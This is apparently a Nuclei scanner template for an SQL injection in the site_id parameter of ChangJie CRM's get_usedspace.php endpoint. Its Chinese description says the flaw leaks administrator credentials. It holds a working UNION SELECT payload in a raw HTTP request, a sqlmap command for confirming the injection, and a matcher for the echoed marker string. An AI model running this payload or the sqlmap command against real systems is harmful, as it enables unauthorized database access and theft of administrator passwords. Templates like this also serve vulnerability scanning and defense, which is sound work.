id: changjieCRM_get_usedspace_sqli
info:
  name: "畅捷CRM get_usedspace.php SQL注入导致管理员凭证泄露"
  author: 0dayPoc
  severity: high
  description: |-
    通过针对WebSer~1/get_usedspace.php接口的参数site_id存在SQL注入漏洞，攻击者可执行恶意SQL查询获取数据库凭证信息。
    验证方法：
      sqlmap -u http://ip:port/WebSer~1/get_usedspace.php?site_id=1 --batch  --current-db
    该漏洞可导致管理员账号密码等敏感数据泄露。
  tags: 畅捷CRM

http:
- raw:
  - |
    GET /WebSer~1/get_usedspace.php?site_id=-1159%20UNION%20ALL%20SELECT%20CONCAT(0x7178767671,0x5664726e476a637a565a50614d4c435745446a50614756506d486d58544b4e646d7a577170685165,0x7171626b71)-- HTTP/1.1
    Host: {{Hostname}}
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
    Connection: close
  matchers-condition: and
  matchers:
  - type: word
    part: header
    words:
    - '200'
  - type: word
    part: body
    words:
    - qxvvqVdrnGjczVZPaMLCWEDjPaGVPmHmXTKNdmzWqphQeqqbkq
